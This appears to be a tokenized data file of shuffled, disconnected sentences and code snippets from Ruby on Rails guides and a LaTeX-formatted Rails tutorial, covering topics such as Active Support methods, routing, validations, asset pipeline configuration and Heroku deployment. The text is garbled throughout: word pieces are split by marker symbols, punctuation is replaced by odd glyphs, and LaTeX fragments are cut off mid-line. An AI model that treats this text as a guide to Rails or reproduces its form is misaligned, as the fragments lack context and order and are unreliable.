▁Active ▁Support ▁defines ▁3 r d ▁person ▁alias es ▁of ▁` String # start _ with ?` ▁and ▁` String # end _ with ?` :
▁The ▁default ▁is ▁`: utc ` .
▁The ▁Bootstrap ▁framework ▁native ly ▁uses ▁the ▁\ href { http :// less css ▖ org /}{ L ess ▁CSS } ▁language ▁for ▁making ▁dynamic ▁stylesheets , ▁but ▁the ▁Rails ▁asset ▁pipeline ▁supports ▁the ▁( ve ry ▁similar ) ▁Sass ▁language ▁by ▁default ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }), ▁so ▁\ text tt { bootstrap - sass } ▁convert s ▁L ess ▁to ▁Sass ▁and ▁make s ▁all ▁the ▁necessary ▁Bootstrap ▁files ▁available ▁to ▁the ▁current ▁application
▁For ▁further ▁Rails ▁learning , ▁I ▁recommend ▁\ href { https :// p ra g prog ▖ com / book / rails 4/ a g ile - web - development - with - rails - 4 } { A g ile ▁Web ▁Development ▁with ▁Rails } ▁by ▁ Sam ▁Ruby , ▁ Dave ▁ Thomas , ▁and ▁ David ▁H einemeier ▁Hansson , ▁\ href { http :// www ▖ a mazon ▖ com / Rails - Edit ion - Addi s on - We s le y - P rofessional - Seri es / d p /0321 9 44 27 5 }{\ emph { The ▁Rails ~ 4 ▁Way } } ▁by ▁O b i e ▁F er n and e z ▁and ▁Ke v in ▁F a us t in o , ▁and ▁\ href { http :// www ▖ a mazon ▖ com / Rails - 4 - Action - Ryan - B ig g / d p / 16 17 2 9 10 99 }{\ emph { Rails ~ 4 ▁in ▁Action } } ▁by ▁ Ryan ▁B ig g ▁and ▁ Y e h u d a ▁ K at z .
▁Date ▖ new (201 0, ▁1, ▁31)▖ change ( month : ▁2 )
▁This ▁helper ▁deal s ▁with ▁those ▁that ▁work ▁with ▁model ▁attributes ; ▁to ▁see ▁an ▁example ▁of ▁form ▁helpers ▁that ▁don ' t ▁work ▁with ▁model ▁attributes , ▁check ▁the ▁ ActionView :: Helpers :: FormTagHelper ▁documentation .
▁1 ▁ row ▁in ▁set ▁(0▖00 ▁ sec )
▁ Each ▁chapter ▁in ▁the ▁tutorial ▁includes ▁ exercises , ▁the ▁complet ion ▁of ▁which ▁is ▁optional ▁but ▁recommended .
▁ / photos / make
▁Tests ▁for ▁pagination .
▁( You ▁can ▁verify ▁this ▁by ▁examining ▁the ▁SQL ▁statement s ▁in ▁the ▁development ▁server ▁log ▁file ▖)
▁In ▁this ▁case , ▁it ' s ▁easy ▁to ▁write ▁a ▁short ▁test ▁for ▁the ▁User ▁model , ▁in ▁which ▁we ▁use ▁\ k ode { following ?}\ ▁to ▁make ▁sure ▁the ▁user ▁isn ' t ▁following ▁the ▁other ▁user , ▁use ▁\ k ode { follow } ▁to ▁follow ▁another ▁user , ▁use ▁\ k ode { following ?}\ ▁to ▁verify ▁that ▁the ▁operation ▁succeed ed , ▁and ▁finally ▁\ k ode { unfollow } ▁and ▁verify ▁that ▁it ▁work ed .
▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p } .
▁* ▁` config ▖ active _ record ▖ lock _ optimistic ally ` ▁control s ▁whether ▁Active ▁Record ▁will ▁use ▁ optimistic ▁ lock ing ▁and ▁is ▁true ▁by ▁default .
▁# ▁Generate s ▁a ▁select ▁field ▁for ▁ months ▁that ▁defaults ▁to ▁the ▁current ▁ month
▁#### # ▁` advance `
▁Because ▁we ▁don ' t ▁expect ▁to ▁retrieve ▁users ▁by ▁remember ▁digest , ▁there ' s ▁no ▁need ▁to ▁put ▁an ▁index ▁on ▁the ▁\ k ode { remember \_ digest } ▁column , ▁and ▁we ▁can ▁use ▁the ▁default ▁migration ▁as ▁generated ▁above :
▁* ▁C on st an t s , ▁in ▁particular ▁class ▁and ▁module ▁names .
▁Because ▁every ▁application ▁handle s ▁this ▁kind ▁of ▁thing ▁different ly , ▁Rails ▁does ╼ not ▁include ▁any ▁view ▁helpers ▁to ▁help ▁you ▁generate ▁these ▁messages ▁directly .
▁The ▁` offset ` ▁method ▁let s ▁you ▁specify ▁the ▁starting ▁ offset ▁for ▁fetch ing ▁objects ▁via ▁an ▁association ▖
▁# ▁# ▁=> ▁< img ▁ alt =" I con " ▁src ="/ assets / icon ▖ png " ▁/>
▁$ ▁bundle ▁exec ▁rake ▁test ╼ 3 ▁tests , ▁6 ▁assertions , ▁0 ▁failure s , ▁0 ▁errors , ▁0 ▁skip s
▁To ▁create ▁the ▁\ k ode { relationships } ▁table , ▁we ▁ migrate ▁the ▁database ▁and ▁ prepare ▁the ▁test ▁database ▁as ▁usual :
▁end _ of _ hour
▁You ▁no ▁longer ▁have ▁to ▁set ▁` default _ url _ options [: script _ name ]` ▁to ▁work ▁around ▁over written ▁URL ▁prefix es .
▁Un safe ▁arguments ▁are ▁escape d :
▁If ▁the ▁source ▁filename ▁has ▁no ▁extension , ▁` ▖ js ` ▁will ▁be ▁ append ed ▖
▁The ▁Rails ▁routes , ▁with ▁a ▁rule ▁for ▁the ▁Users ▁resource .
▁( Because ▁we ▁have n ' t ▁implemented ▁the ▁ destruction ▁of ▁ associated ▁microposts ▁yet , ▁this ▁code ▁won ' t ▁current ly ▁work , ▁and ▁is ▁included ▁only ▁to ▁illustrate ▁the ▁principle ▖)
▁### ▁` errors [: base ]`
▁╼╼ The n ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁ Methods ▁are ▁provided ▁for ▁ phone ▁number s , ▁ currency , ▁ percentage , ▁ precision , ▁position al ▁notation , ▁and ▁file ▁size .
▁A ▁partial ▁for ▁the ▁site ▁ footer .
▁ Writ ing ▁the ▁application ▁code ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : create _ destroy _ micropost _ tests } ▁to ▁pass ▁requires ▁a ▁little ▁refactoring ▁first .
▁The ▁f ive ▁ year ▁ ra d i us ▁can ▁be ▁changed ▁using ▁the ▁`: start _ year ` ▁and ▁`: end _ year ` ▁keys ▁in ▁the ▁` options ` .
▁Because ▁we ▁have ▁already ▁properly ▁prepar ed ▁the ▁test ▁database ▁with ▁\ k ode { rake ▁test : prepare }, ▁the ▁tests ▁should ▁pass :
▁# ▁return ▁a ▁collection ▁with ▁all ▁users
▁Here ▁the ▁\ k ode { errors ▖ full \_ messages } ▁object ▁( which ▁we ▁saw ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : presence _ validation }) ▁contains ▁an ▁array ▁of ▁error ▁messages .
▁A lthough ▁we ' ll ▁ never ▁need ▁to ▁edit ▁it ▁in ▁the ▁main ▁tutorial , ▁an ▁example ▁of ▁adding ▁a ▁rule ▁to ▁the ▁\ k ode { ▖ gitignore } ▁file ▁appears ▁in ▁Section ~\ ref { sec : guard }, ▁which ▁is ▁part ▁of ▁the ▁optional ▁advanced ▁testing ▁setup ▁in ▁Section ~\ ref { sec : advance d _ testing _ setup } .
▁A ▁mockup ▁of ▁a ▁profile ▁page ▁with ▁microposts .
▁has _ many ▁: count r ies
▁ //= ▁require ▁sub / something
▁<%= ▁button _ to ▁" A n ▁article ", ▁@ article , ▁remote : ▁true ▁%>
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Flash "
▁That ▁\ emph { is } ▁what ▁we ▁want , ▁and ▁it ▁lead s ▁to ▁the ▁\ k ode { password \_ reset \_ expired ?}\ ▁method ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired } .
▁The ▁directory ▁structure ▁for ▁a ▁new ly ▁created ▁Rails ▁app .
▁#### ▁Link ing ▁to ▁CSS ▁File s ▁with ▁the ▁` stylesheet _ link _ tag `
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ bcrypt _ cost _ factor } .
▁in ▁Listing ~\ ref { code : hello _ action } ▁and
▁Note ▁the ▁presence ▁of ▁\ text tt { https :// } ▁and ▁a ▁ lock ▁ icon ▁in ▁the ▁address ▁bar ▁of ▁Figure ~\ ref { fig : signup _ in _ production }, ▁which ▁indicate ▁that ▁SSL ▁is ▁working .
▁in ▁Listing ~\ ref { code : login _ create _ user _ instance } ▁and
▁| ▁** In form ation al ** ▁| ▁100 ▁| ▁: con t in ue ▁|
▁As ▁seen ▁in ▁Listing ~\ ref { code : default _ root _ route }, ▁the ▁Rails ▁routes ▁file ▁(\ k ode { config / routes ▖ rb }) ▁includes ▁a ▁comment ed - out ▁line ▁that ▁shows ▁how ▁to ▁structure ▁the ▁root ▁route .
▁Add ▁a ▁test ▁for ▁the ▁email ▁downcas ing ▁from ▁Listing ~\ ref { code : email _ downcase }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : email _ downcase _ test } .
▁A ▁\ k ode { before \_ create } ▁callback ▁to ▁create ▁\ k ode { remember \_ token } .
▁We ' ll ▁accomplish ▁this ▁using ▁the ▁\ k ode { where } ▁method ▁on ▁the ▁\ k ode { Micropost } ▁model ▁( se en ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : activation _ resets _ exercises }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed }
▁You ▁will ▁need ▁to ▁add ▁the ▁` rails - observers ` ▁gem ▁if ▁you ▁require ▁these ▁features .
▁Associations ▁ com put e ▁the ▁name ▁of ▁the ▁corresponding ▁default ▁ associated ▁class ▁using ▁this ▁method :
▁* ▁`: words _ connect or `: ▁What ▁is ▁used ▁to ▁join ▁the ▁elements ▁of ▁arrays ▁with ▁3 ▁or ▁more ▁elements , ▁except ▁for ▁the ▁last ▁two ▖
▁How ▁to ▁Use ▁the ▁ Asset ▁Pipeline
▁The ▁an g le ▁bracket ~\ k ode { < } ▁indicates ▁that ▁\ k ode { StaticPages Controller } ▁\ emph { in her it s } ▁from ▁the ▁Rails ▁class ▁\ k ode { Application Controller } ; ▁as ▁we ' ll ▁see ▁moment ar ily , ▁this ▁means ▁that ▁our ▁pages ▁come ▁ equ ip ped ▁with ▁a ▁large ▁amount ▁of ▁Rails - specific ▁functionality .
▁ Query ▁strings ▁in ▁particular ▁do ▁not ╼ work ▁at ▁all ▁with ▁some ▁CDN s ▁for ▁cache ▁in validation .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : users _ link }
▁yields
▁# ▁=> ▁< Client ▁id : ▁nil , ▁first _ name : ▁" N ic k ", ▁orders _ count : ▁ 0, ▁ locked : ▁true , ▁created _ at : ▁"2011- 08 - 30 ▁06:09:27" , ▁updated _ at : ▁"2011- 08 - 30 ▁06:09:27" >
▁You ▁can ▁also ▁push ▁the ▁app ▁up ▁to ▁Heroku ▁at ▁this ▁point .
▁The ▁\ k ode { has \_ many } ▁relationship ▁between ▁a ▁user ▁and ▁its ▁microposts .
▁With ▁our ▁test ▁suite ▁passing ▁again , ▁we ▁can ▁move ▁on ▁to ▁a ▁more ▁challenging ▁validation : ▁email ▁format .
▁The ▁`` hidden '' ▁\ k ode { input } ▁tag ▁ puts ▁the ▁relevant ▁information ▁on ▁the ▁page ▁without ▁display ing ▁it ▁in ▁the ▁browser .
▁# ▁=> ▁Sun , ▁ 08 ▁A ug ▁2010 ▁2 1 :00:00 ▁UTC ▁+00:00
▁S up po se ▁you ▁have ▁the ▁following ▁` Application Controller ` ▁layout :
▁$ ▁git ▁re base ▁- i
▁We ' ll ▁ begin ▁by ▁adding ▁some ▁content ▁to ▁the ▁Home ▁page ▁using ▁test - driven ▁development , ▁including ▁a ▁to p - level ▁ head ing ▁(\ k ode { < h 1> }) ▁with ▁the ▁content ▁\ k ode { Sample ▁App } ▖ ▁The ▁first ▁step ▁is ▁to ▁generate ▁an ▁integration ▁test ▁( request ▁ spec ) ▁for ▁our ▁static ▁pages :
▁#### ▁ Array ▁of ▁M ultiple ▁Associations
▁For ▁example , ▁these ▁two ▁image ▁tags ▁would ▁return ▁the ▁same ▁code :
▁#< Client ▁id : ▁1, ▁first _ name : ▁" Lifo "> ,
▁A ▁mockup ▁of ▁login ▁failure .
▁Now ▁let ' s ▁focus ▁on ▁the ▁" U " ▁part , ▁updating ╼ articles .
▁Rails ▁automatically ▁prevent s ▁the ▁third ▁problem ▁by ▁es c a p ing ▁any ▁content ▁inserted ▁into ▁view ▁templates .
▁As ▁a ▁cap st one ▁to ▁our ▁work ▁on ▁account ▁activation ▁and ▁password ▁re m in d ers , ▁in ▁this ▁section ▁we ' ll ▁configure ▁our ▁application ▁so ▁that ▁it ▁can ▁actually ▁send ▁email ▁in ▁production .
▁A ▁ summary ▁of ▁user / micropost ▁association ▁methods .
▁### ▁Route s
▁\ label { fig : signup _ success _ mockup } }╼\ end { figure }╼╼ ▁\ subsection { The ▁ finished ▁signup ▁form } ▁% ▁( fold )╼ ▁\ label { sec : the _ finished _ signup _ form }╼╼
▁To ▁fix ▁this , ▁we ▁want ▁\ k ode { authenticated ?}\ ▁to ▁return ▁\ k ode { false } ▁instead .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ' ll ▁use ▁the ▁\ k ode { authenticate } ▁method ▁to ▁sign ▁registered ▁users ▁into ▁our ▁site .
▁To ▁generate ▁an ▁engine , ▁you ▁will ▁need ▁to ▁run ▁the ▁plugin ▁generator ▁and ▁pass ▁it ╼ options ▁as ▁appropriate ▁to ▁the ▁need ▖
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁by ▁ Ryan ▁Bates : ▁D id ▁I ▁already ▁ ment ion ▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ?
▁| ` smtp _ settings ` | Allow s ▁ detailed ▁configuration ▁for ▁`: smtp ` ▁ delivery ▁method :
▁As ▁we ' ll ▁see ▁in ▁the ▁next ▁section , ▁this ▁allows ▁us ▁to ▁define ▁ factory ▁microposts ▁as ▁follows :
▁You ▁can ▁also ▁specify ▁validations ▁to ▁be ▁ strict ▁and ▁raise ╼` ActiveModel :: Strict V al id ation F a ile d ` ▁when ▁the ▁object ▁is ▁invalid .
▁ assert _ generate s ▁' / about ', ▁controller : ▁' pages ', ▁action : ▁' about '
▁Because ▁we ▁wrote ▁working ▁application ▁code ▁first , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁( If ▁you ▁set ▁up ▁the ▁\ k ode { co } ▁alias ▁in ▁Section ~\ ref { sec : version _ control }, ▁you ▁can ▁use ▁\ k ode { git ▁co ▁- b ▁modify - README } ▁instead ▖)
▁# ▁If ▁you ▁are ▁not ▁using ▁ActiveRecord , ▁you ▁can ▁remove ▁this ▁line .
▁ Follow ing ▁the ▁pattern ▁set ▁by ▁remember ▁token s ▁( Section ~\ ref { sec : remember _ me }) ▁and ▁account ▁activation ▁token s ▁( Section ~\ ref { sec : account _ activation }), ▁password ▁resets ▁will ▁pair ▁a ▁virtual ▁reset ▁token ▁for ▁use ▁in ▁the ▁reset ▁email ▁with ▁a ▁corresponding ▁reset ▁digest ▁for ▁re t ri e v ing ▁the ▁user .
▁beginning _ of _ month ▁( at _ beginning _ of _ month )
▁Creat ing ▁the ▁first ▁app ▁repository ▁at ▁GitHub ▖ ~\ href { http :// railstutorial ▖ org / images / figures / create _ first _ repository _4_0 - full ▖ png }{( full ▁size )}
▁We ' ve ▁seen ▁how ▁the ▁User ▁model ▁generation ▁in ▁Listing ~\ ref { code : generate _ user _ model } ▁generated ▁a ▁migration ▁file ▁( Listing ~\ ref { code : users _ migration }), ▁and ▁we ▁saw ▁in ▁Figure ~\ ref { fig : sqlite _ database _ browser } ▁the ▁results ▁of ▁running ▁this ▁migration : ▁it ▁updated ▁a ▁file ▁called ▁\ k ode { development ▖ sqlite 3 } ▁by ▁creating ▁a ▁table ▁\ k ode { users } ▁with ▁columns ▁\ k ode { id }, ▁\ k ode { name }, ▁\ k ode { email }, ▁\ k ode { created \_ at }, ▁and ▁\ k ode { updated \_ at } .
▁As ▁seen ▁in ▁Figure ~\ ref { fig : login _ failure _ mockup }, ▁when ▁the ▁login ▁information ▁is ▁invalid ▁we ▁want ▁to ▁re - render ▁the ▁login ▁page ▁and ▁display ▁an ▁error ▁message .
▁After ▁Active ▁Record ▁has ▁perform ed ▁validations , ▁any ▁errors ▁found ▁can ▁be ▁access ed ╼ through ▁the ▁` errors ▖ messages ` ▁instance ▁method , ▁which ▁returns ▁a ▁collection ▁of ▁errors .
▁<%= ▁render ▁partial : ▁" link _ area ", ▁layout : ▁" gr a y bar " ▁%>
▁** Overriding ** ▁` Article # summary `:
▁ Core ▁application ▁( app ) ▁code , ▁including ▁models , ▁views , ▁controllers , ▁and ▁helpers
▁The ▁name ▁of ▁the ▁file ▁is ▁passed ▁as ▁an ▁argument , ▁and ▁the ▁method ▁yields ▁a ▁file ▁handle ▁open ed ▁for ▁writing ▖
▁But ▁other , ▁old er ▁browsers ▁( such ▁as ▁Web T V ▁and ▁ IE ▁5 ▖ 5 ▁on ▁M ac ) ▁can ▁actually ▁cause ▁the ▁page ▁to ▁fail ▁to ▁load ▖
▁$ ▁bundle ▁exec ▁rake ▁test ╼ Abstract Controller :: Action Not F ound : ╼ The ▁action ▁' about ' ▁could ▁not ▁be ▁found ▁for ▁StaticPages Controller
▁<%= ▁form _ for ▁@ person , ▁url : ▁ { action : ▁" create "} ▁do ▁| f | ▁%>
▁ port : ▁5 87 ,
▁For ╼ example , ▁if ▁you ' d ▁call ▁`@ article ▖ update ( title : ▁' A ▁new ▁title ') `╼ Rails ▁would ▁only ▁update ▁the ▁` title ` ▁attribute , ▁leav ing ▁all ▁other ╼ attributes ▁un touch ed .
▁The ▁word ▁`` de if i ed '' ▁is ▁a ▁ palindrome .
▁& lt ; html & gt ; & lt ; fo nt ▁ color = r ed & gt ; h e y & lt ; / fo nt & gt ; & lt ; / html & gt ; ▁[ A rb it ary ▁ malicious ▁input ▁is
▁Let ' s ▁add ▁links ▁to ▁the ▁other ▁views ▁as ▁well , ▁starting ▁with ▁adding ▁this ╼ " New ▁Article " ▁link ▁to ▁` app / views / articles / index ▖ html ▖ erb `, ▁ placing ▁it ▁above ▁the ╼` < table >` ▁tag :
▁In ▁plain ▁Ruby , ▁these ▁methods ▁would ▁simply ▁do ▁not h ing .
▁The ▁logged ▁in ▁user ▁layout ▁m ight ▁include ▁to p - level ▁navigation ▁that ▁should ▁be ▁present ▁a cross ▁many ▁controller ▁actions ▖
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : account _ activation _ and _ password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁ registration ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ) .
▁For ▁example , ▁suppose ▁you ▁have ▁this ▁set ▁of ▁routes :
▁100 ▖ to _ s (: percentage , ▁ precision : ▁0 )
▁### ▁` indent `
▁At ▁this ▁point , ▁you ▁can ▁also ▁deploy ▁the ▁toy ▁app ▁to ▁Heroku ▁as ▁in ▁Section ~\ ref { sec : deploying } :
▁Un like ▁strings , ▁not ▁all ▁characters ▁are ▁valid :
▁With ▁the ▁code ▁from ▁Listing ~\ ref { code : hello _ action } ▁and ▁Listing ~\ ref { code : hello _ root _ route }, ▁the ▁root ▁route ▁returns ▁`` hello , ▁world !''
▁When ▁possible , ▁it ▁is ▁best ▁to ▁first ▁test ▁your ▁back port ▁local ly ▁again st ▁the ▁Ruby ▁versions ▁list ed ▁in ▁` ▖ t ra v is ▖ yml ` ▁before ▁ submitting ▁your ▁pull ▁request .
▁in ▁Listing ~\ ref { code : real _ user _ fixture } .
▁ From ▁the ▁security ▁stand point , ▁if ▁you ▁don ' t ▁expect ▁to ▁have ▁any ▁markup ▁in ▁your ╼ response ▁ body , ▁you ▁should ▁be ▁using ▁` render ▁: plain ` ▁as ▁most ▁browsers ▁will ▁escape ╼ un safe ▁content ▁in ▁the ▁response ▁for ▁you .
▁alias _ method ▁: process _ with out _ stringified _ params , ▁: process
▁Because ▁the ▁application ▁code ▁was ▁working , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁This ▁m ight ▁look ▁confusing --- most ▁languages ▁don ' t ▁let ▁you ▁use ▁the ▁equal s ▁sign ▁in ▁a ▁method ▁definition --- but ▁it ▁simply ▁defines ▁a ▁method ▁\ k ode { current \_ user = } ▁express ly ▁design ed ▁to ▁handle ▁assignment ▁to ▁\ k ode { current \_ user } .
▁The ▁` has _ one ` ▁association ▁creates ▁a ▁one - to - one ▁match ▁with ▁another ▁model ▖
▁We ' ll ▁use ▁this ▁method ▁to ▁replace ▁code ▁like
▁Return s ▁a ▁string ▁of ▁` option ` ▁tags , ▁like ▁` options _ from _ collection _ for _ select `, ▁but ▁ groups ▁them ▁by ▁` optgroup ` ▁tags ▁base d ▁on ▁the ▁object ▁relationships ▁of ▁the ▁arguments .
▁ category ▁= ▁ Category ▖ first
▁Find ▁or ▁Buil d ▁a ▁ New ▁Object
▁H ig h - level ▁ overview ▁of ▁Rails
▁ ex - b 4 b b b 0 ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁sample _ following _ data ▁( end )╼╼ ▁\ subsection { S t at s ▁and ▁a ▁follow ▁form } ▁% ▁( fold )╼ ▁\ label { sec : stats _ and _ a _ follow _ form }╼╼
▁ ╼ ▁$ ▁rails ▁server ▁-- environment ▁production
▁To ▁fix ▁this , ▁re install ▁ RVM ▁using ▁the ▁\ k ode { c lang } ▁flag :
▁If ▁you ▁compare ▁this ▁with ▁the ▁analogous ▁line ▁on ▁the ▁user ▁index ▁page , ▁Listing ~\ ref { code : will _ paginate _ index _ view }, ▁you ' ll ▁see ▁that ▁before ▁we ▁ha d ▁just
▁The ▁results ▁appear ▁in ▁Figure ~\ ref { fig : site _ with _ footer } .
▁# ▁Call s ▁+ to _ param + ▁on ▁all ▁its ▁elements ▁and ▁ joins ▁the ▁result ▁with
▁The ▁fully ▁ refactored ▁users ▁index ▖
▁### ▁ Update ▁Your ▁B r an ch
▁For ▁instance ▁` stringify _ keys ` ▁and ▁` symbolize _ keys ` ▁use ▁` transform _ keys ` ▁to ▁perform ▁their ▁key ▁ conversions :
▁A ▁first ▁ cut ▁at ▁the ▁\ k ode { from \_ users \_ followed \_ by } ▁method .
▁Having ▁updated ▁the ▁form , ▁we ▁now ▁need ▁to ▁arrange ▁for ▁the ▁Relationship s ▁controller ▁to ▁respond ▁to ▁Ajax ▁requests .
▁The ▁h y p er text ▁ tr an s f er ▁protocol ▁(\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # Request _ methods } { HTTP }) ▁defines ▁the ▁basic ▁operations ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE } ▖ ▁These ▁refer ▁to ▁operations ▁between ▁a ▁\ emph { client } ▁computer ▁( t y p ical ly ▁running ▁a ▁web ▁browser ▁such ▁as ▁C h r o me , ▁ Firefox , ▁or ▁ Safari ) ▁and ▁a ▁\ emph { server } ▁( t y p ical ly ▁running ▁a ▁web ▁server ▁such ▁as ▁ Apache ▁or ▁N g in x ) .
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁push ╼ $ ▁git ▁push ▁ heroku ╼ $ ▁ heroku ▁run ▁rake ▁db : migrate
▁A ▁class ▁or ▁module ▁is ▁ marked ▁with ▁`: no doc : ` ▁to ▁indicate ▁that ▁all ▁methods ▁are ▁ internal ▁API ▁and ▁should ▁ never ▁be ▁used ▁directly .
▁also ▁generates ▁a ▁controller ▁called ▁\ k ode { static \_ pages \_ controller ▖ rb } .
▁name ▁= ▁name ▖ camelize ▁if ▁ camelize ?
▁So , ▁to ▁receive ▁email s ▁in ▁your ▁Rails ▁app ▁you ' ll ▁need ▁to :
▁Create s ▁a ▁scope ▁around ▁a ▁specific ▁model ▁object ▁like ▁form _ for , ▁but ▁doesn ' t ▁create ▁the ▁form ▁tags ▁themselves ▖
▁As ▁with ▁the ▁console , ▁\ text tt { development } ▁is ▁the ▁default ▁environment ▁for ▁the ▁local ▁Rails ▁server , ▁but ▁you ▁can ▁also ▁run ▁it ▁in ▁a ▁different ▁environment :
▁ paintIt ▁= ▁( e le ment , ▁ backgroundColor , ▁textColor ) ▁->
▁as ▁seen ▁in ▁Listing ~\ ref { code : log _ in _ password _ resets } ▁and ▁Figure ~\ ref { fig : forgot _ password _ link } .
▁When ▁build ing ▁web ▁applications , ▁it ▁is ▁often ▁useful ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁the ▁user ▁interface ▁as ▁ early ▁as ▁possible .
▁* = ▁require _ self
▁Rails ▁is ▁a ▁web ▁application ▁framework ▁running ▁on ▁the ▁Ruby ▁programming ▁language .
▁1 000 ▖ to _ s (: percentage , ▁ delimiter : ▁' ▖ ', ▁ separator : ▁ ', ')
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁HTTP ▁request
▁An ▁in com ing ▁path ▁of ▁` / photos / show /1 ? user _ id = 2 ` ▁will ▁be ▁ dispatch ed ▁to ▁the ▁` show ` ▁action ▁of ▁the ▁` Photos ` ▁controller ▖
▁Note ▁the ▁use ▁of ▁\ k ode { if ▁@ user ▖ microposts ▖ any ?}\ ▁( a ▁construction ▁we ▁saw ▁before ▁in ▁Listing ~\ ref { code : errors _ partial }), ▁which ▁make s ▁sure ▁that ▁an ▁empty ▁list ▁won ' t ▁be ▁displayed ▁when ▁the ▁user ▁has ▁no ▁microposts .
▁Similar ly , ▁` since ` ▁move s ▁forward :
▁In ▁other ▁words , ▁we ▁change
▁Setting ▁the ▁`: as ` ▁option ▁indicates ▁that ▁this ▁is ▁a ▁ polymorphic ▁association ▖
▁$ ▁rails ▁console
▁Client ▖ unscope d ▁ {
▁There ' s ▁actually ▁a ▁ subtle ▁difference , ▁which ▁is ▁that ▁\ k ode { p } ▁returns ▁the ▁object ▁being ▁ print ed ▁while ▁\ k ode { puts } ▁always ▁returns ▁\ k ode { nil } .
▁To ▁get ▁started , ▁users ▁\ emph { not } ▁using ▁the ▁ Cloud 9 ▁IDE ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment } ▁should ▁make ▁a ▁\ k ode { workspace } ▁directory ▁for ▁your ▁Rails ▁ projects ▁if ▁it ▁doesn ' t ▁already ▁exist ▁( Listing ~\ ref { code : mkdir _ rails _ projects }) ▁and ▁then ▁change ▁into ▁the ▁directory .
▁That ' s ▁like ▁` Time ▖ now `, ▁except ▁that ▁it ▁h on or s ▁the ▁user ▁time ▁ zone , ▁if ▁defined ▖
▁Creat ing ▁a ▁Job
▁action : ▁' greeting ') ▁%>
▁If ▁you ▁use ▁the ▁`: json ` ▁option , ▁` render ` ▁will ▁automatically ▁call ▁` to _ json ` ▁for ▁you .
▁For ▁example , ▁let ' s ▁say ▁you ' d ▁like ▁params ▁to ▁be ▁strings ▁in ▁functional ▁tests , ▁as ▁they ▁are ▁in ▁real ▁requests , ▁but ▁ still ▁want ▁the ▁convenience ▁of ▁assign ing ▁ integer s ▁and ▁other ▁kind ▁of ▁values ▖
▁Use ▁a ▁separate ▁ erb ▁view ▁instead .
▁| ▁id ▁| ▁select _ type ▁| ▁table ▁| ▁type ▁| ▁possible _ keys ▁|
▁User ▖ update _ all ▁" max _ login _ attempt s ▁= ▁3 , ▁must _ change _ password ▁= ▁' true ' "
▁Configur able ▁with ▁the ▁` config ▖ action _ dispatch ▖ ip _ s po of ing _ check `, ▁and ▁` config ▖ action _ dispatch ▖ tr us ted _ p r o x ies ` ▁options .
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : jquery _ file _ test } .
▁Ou r ▁eventual ▁goal ▁for ▁the ▁user ▁profile ▁pages ▁is ▁to ▁show ▁the ▁user ' s ▁profile ▁image , ▁basic ▁user ▁data , ▁and ▁a ▁list ▁of ▁microposts , ▁as ▁ mock ed ▁up ▁in ▁Figure ~\ ref { fig : profile _ mockup }
▁I de ally , ▁we ▁would ▁check ▁that ▁the ▁cookie ' s ▁value ▁is ▁equal ▁to ▁the ▁user ' s ▁remember ▁token , ▁but ▁as ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁for ▁the ▁test ▁to ▁get ▁access ▁to ▁it : ▁the ▁\ k ode { user } ▁variable ▁in ▁the ▁controller ▁has ▁a ▁remember ▁token ▁attribute , ▁but ▁( because ▁\ k ode { remember \_ token } ▁is ▁virtual ) ▁the ▁\ k ode {@ user } ▁variable ▁in ▁the ▁test ▁doesn ' t .
▁See ╼[ P re compiling ▁ Asset s ](# pre compiling - assets ) ▁for ▁ guid ance .
▁The ▁ macro ▁` attr _ internal ` ▁is ▁a ▁ sy n on y m ▁for ▁` attr _ internal _ accessor `:
▁This ▁will ▁call ▁` image _ path ` ▁internally ▁and ▁merge ▁with ▁your ▁current ▁host ▁or ▁your ▁asset ▁host .
▁Let ' s ▁focus ▁on ▁one ▁particular ▁line ▁in ▁Listing ~\ ref { code : application _ layout _ redux } :
▁When ▁the ▁content ▁is ╼ updated , ▁the ▁fingerprint ▁will ▁change ▖
▁from ▁Listing ~\ ref { code : palindrome _ test er } ▁to
▁The ▁order ▁in ▁which ▁these ▁classes ▁are ▁returned ▁is ▁un spec if i ed .
▁By ▁identify ing ▁the ▁\ k ode { user } ▁as ▁\ k ode { michael }, ▁we ▁tell ▁Rails ▁to ▁associate ▁this ▁micropost ▁with ▁the ▁corresponding ▁user ▁in ▁the ▁users ▁fixture :
▁def ▁self ▖ published
▁Next , ▁ bootstrap ▁the ▁Spork ▁configuration :
▁The ▁\ k ode { UsersController } ▁class , ▁with ▁inheritance .
▁ Adding ▁a ▁line ▁for ▁asset ▁pipeline ▁ compatibility .
▁( 4 ▖ months ▁+ ▁5 ▖ years )▖ from _ now
